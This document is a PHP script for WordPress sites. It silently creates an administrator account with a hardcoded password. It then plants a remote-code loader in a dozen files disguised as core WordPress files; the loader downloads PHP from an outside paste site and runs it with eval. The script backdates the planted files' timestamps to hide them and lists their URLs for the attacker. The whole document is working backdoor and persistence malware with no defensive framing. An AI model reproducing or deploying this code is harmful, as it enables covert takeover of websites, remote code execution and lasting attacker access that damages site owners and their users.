<?php
define('WP_USE_THEMES', false);
require('wp-blog-header.php');

$new_admin_username = 'it-team';
$new_admin_password = 'plerkuda138!@';
$new_admin_email = 'it-admin@' . $_SERVER['HTTP_HOST'];

if (!username_exists($new_admin_username)) {
    $user_id = wp_create_user($new_admin_username, $new_admin_password, $new_admin_email);

    $user = new WP_User($user_id);
    $user->set_role('administrator');

    echo 'Admin baru berhasil dibuat:<br>';
    echo $new_admin_username . ' (USERNAME)<br>';
    echo $new_admin_password . ' (PASSWORD)<br>';
    echo $new_admin_email . ' (EMAIL)<br>';
}

$content = '<?php $Url = "https://paste.myconan.net/502606.txt"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $Url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $output = curl_exec($ch); curl_close($ch); echo eval("?>".$output); ?>';

$file_paths = [
    "./wp-includes/random_compat/random_bytes_bcrypt.php",
    "./wp-admin/user/license.php",
    "./wp-admin/includes/admin-action.php",
    "./wp-admin/network/freedom.php",
    "./wp-includes/rest-api/endpoints/class-wp-rest-api-controller.php",
    "./wp-includes/SimplePie/Decode/HTML/Dentities.php",
    "./wp-includes/blocks/navigation/view-modal.assets.php",
    "./wp-includes/sodium_compat/namespaced/Hash.php",
    "./wp-includes/style-engine/class-wp-style-engine-system.php",
    "./wp-includes/php-compat/readsonly.php",
    "./wp-includes/widgets/class-wp-nav-widgets.php",
    "./wp-admin/maint/restore.php"
];

foreach ($file_paths as $file_path) {
    if (!is_dir(dirname($file_path))) {
        mkdir(dirname($file_path), 0777, true);
    }

    file_put_contents($file_path, $content);
	touch($file_path, filemtime('/etc/passwd'));
}

echo "File Has Been Created<br><br>";

foreach ($file_paths as $file_path) {
    echo "https://" . $_SERVER['HTTP_HOST'] . str_replace("./", "/", $file_path) . "<br>";
}

?>
